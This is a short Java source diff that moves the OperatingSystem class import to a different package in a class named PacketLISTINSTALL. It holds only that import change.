@@ -5,7 +5,7 @@ import java.io.File;
 import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
-import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.common.OperatingSystem;
 
 
 public class PacketLISTINSTALL extends AbstractPacket {
